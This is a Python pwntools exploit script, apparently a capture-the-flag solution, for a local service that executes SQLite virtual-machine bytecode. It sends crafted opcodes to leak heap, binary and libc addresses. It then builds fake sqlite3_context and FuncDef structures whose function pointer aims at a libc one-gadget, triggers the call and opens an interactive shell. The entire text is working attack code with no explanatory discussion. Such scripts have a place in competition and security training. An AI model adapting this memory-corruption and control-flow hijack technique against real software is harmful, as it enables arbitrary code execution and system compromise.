from pwn import *

r = remote("0", 1337)

r.sendlineafter(b":", b"1\n1\nSELECT 1.1\n")
r.recvuntil(b"Done");

def op(opcode, p4type, p5, p1, p2, p3, p4):
    return p8(opcode) + p8(p4type) + p16(p5) + p32(p1) + p32(p2) + p32(p3) + p64(p4)

def leak(addr):
    bytecode = op(8, 0, 0, 0, 4, 0, 0) + p8(72) + p8(243) + p16(0) + p32(0) + p32(1) + p32(0) + addr
    r.sendline(b"5\n1\n" + str(len(bytecode)).encode());
    r.sendline(bytecode)
    r.recvuntil(b"It has been done.")
    r.sendline(b"2")
    r.sendline(b"1")
    r.recvuntil(b"? ")
    return int(r.recvline().decode().split(",")[0])

heapleak = leak(b"\xe0")

assert heapleak & 0xff == 0x08
heap = heapleak - 57352

log.info("heap: " + hex(heap))

baseleak = leak(p64(heap + 0x640))
assert baseleak & 0xff == 0x87
base = baseleak - 0xe3d87
log.info("base: " + hex(base))

printf = leak(p64(base + 1158872))
assert printf & 0xff == 0xf0
libc = printf - 394992
log.info("libc: " + hex(libc))
oneGadget = libc + 0xebc88

# Leak address of a query's scratch
scratch = heap + 0xabe8

# Craft fake sqlite3_context (vdbeInt.h)
# Mem* pOut -> ovewritten
context = p64(0)
# FuncDef* pFunc -> needs to be another controlled ptr
context += p64(scratch + 0x8 * 7)
# Mem* pMem -> notused
context += p64(0)
# Vdbe* pVdbe -> overwritten
context += p64(0)
# int iOp, int isError -> not used except error which should be 0
context += p32(0) + p32(0)
# u8 skipFlag, u8 argc
context += p8(0) + p8(0)
# pad
context += p16(0) + p32(0)
# argv 
context += p64(scratch + 100) # nulls

# fake FuncDef (sqliteInt.h) -> only 
# i8
context += p8(0)
# pad to 32 bits
context += p8(0) + p16(0)
# u32 funcFlags, void* pUserData
context += p32(0) + p64(0)
# FuncDef* pNext, func* xSFunc (target)
context += p64(0) + p64(oneGadget)

# pad nulls
context = context.ljust(120, b"\x00")

# Write context 
r.sendline(b"5\n1\n" + str(len(context)).encode());
r.sendline(context)
r.recvuntil(b"It has been done.")

# Create another query to overwrite with function call
r.sendline(b"1\n2\nSELECT 1.0\n")
r.recvuntil(b"Done");
bytecode = op(66, 241, 0, 0, 0, 0, scratch)
r.sendline(b"5\n2\n" + str(len(bytecode)).encode());
r.sendline(bytecode)
r.recvuntil(b"It has been done.")
r.sendline(b"2")
r.sendline(b"2")

log.success("go!")
# pray
r.interactive()
